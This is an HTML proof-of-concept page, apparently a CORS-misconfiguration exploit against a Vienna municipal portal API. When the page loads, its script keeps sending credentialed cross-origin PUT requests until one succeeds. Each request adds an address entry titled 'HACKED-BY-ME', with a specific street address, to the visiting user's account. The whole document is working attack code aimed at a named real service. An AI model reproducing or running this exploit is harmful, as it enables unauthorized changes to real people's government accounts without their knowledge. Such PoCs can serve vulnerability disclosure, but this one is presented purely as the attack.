<!DOCTYPE html>
<html>
<head>
    <title>HACKED BY ME</title>
</head>
<body onload="exploitCORS()">
    <h1>CORS-MISCONFIG</h1>
    <div id="result">Exploit starting...</div>

    <script>
        async function exploitCORS() {
            const resultDiv = document.getElementById('result');
            
            // Keep trying until success
            while (true) {
                try {
                    const response = await fetch('https://mein.wien.gv.at/broker/public/api/Datenblock/JSPutDatenblock', {
                        method: 'PUT',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json, text/javascript, */*; q=0.01',
                            'X-Requested-With': 'XMLHttpRequest'
                        },
                        credentials: 'include',
                        body: JSON.stringify({
                            "id": null,
                            "datensatz": "5797DABA-954A-4206-8922-39FED77C454D",
                            "inhalt": {
                                "title": "HACKED-BY-ME",
                                "standard": false,
                                "address": "Gudrunstraße 29/2, 1100 Wien",
                                "coordinates": [16.390721448021026, 48.175427363211405],
                                "source": "DSS-Portal/OGD",
                                "inhalt": {
                                    "adresse": {
                                        "adressart": 0,
                                        "adresse": "Gudrunstraße 29/2, 1100 Wien",
                                        "adresseKurzschreibweise": "Gudrunstraße 29/2",
                                        "adressobjektId": 10221247,
                                        "gemeindebezirksbezeichnung": "Favoriten",
                                        "gemeindebezirksnummer": 10,
                                        "gemeindekennziffer": 90001,
                                        "gemeindename": "Wien",
                                        "koordinatenbezugssystem": 4326,
                                        "ländercode": "AUT",
                                        "orientierungsnummer": "20",
                                        "orientierungsnummerLage": 0,
                                        "ortskennziffer": 91001,
                                        "ortsname": "Favoriten",
                                        "straßenkennziffer": 1660,
                                        "zugangsadresspunktX": 48.175427363211405,
                                        "zugangsadresspunktY": 16.390721448021026,
                                        "PLZ": 1100,
                                        "zusatzinformationen": {
                                            "adressStraßenname": "Gudrunstraße",
                                            "baublock": "",
                                            "NUTS2": "",
                                            "orientierungsnummerVon": "29",
                                            "orientierungsnummerVerbindungszeichen": 0,
                                            "straßenabschnittsId": "01660009017",
                                            "zählbezirk": "1002",
                                            "zählgebiet": "10023"
                                        }
                                    },
                                    "eingang": "",
                                    "geschosstyp": "",
                                    "stiege": "2",
                                    "stock": "",
                                    "zimmer": "",
                                    "zimmertyp": "Tür"
                                }
                            }
                        })
                    });

                    if (response.ok) {
                        const data = await response.json();
                        resultDiv.innerHTML = '✅ EXPLOIT SUCCESSFUL!<br><br>' +
                                            'The address with title "HACKED-BY-ME" has been added to your addresses.<br><br>';
                                            
                        resultDiv.style.color = 'red';
                        resultDiv.style.fontWeight = 'bold';
                        
                       
                        alert(JSON.stringify(data, null, 2));
                        break; 
                    }
                } catch (error) {
                
                    resultDiv.innerHTML = 'Trying...';
                }
                
                await new Promise(resolve => setTimeout(resolve, 200));
            }
        }
    </script>
</body>
</html>
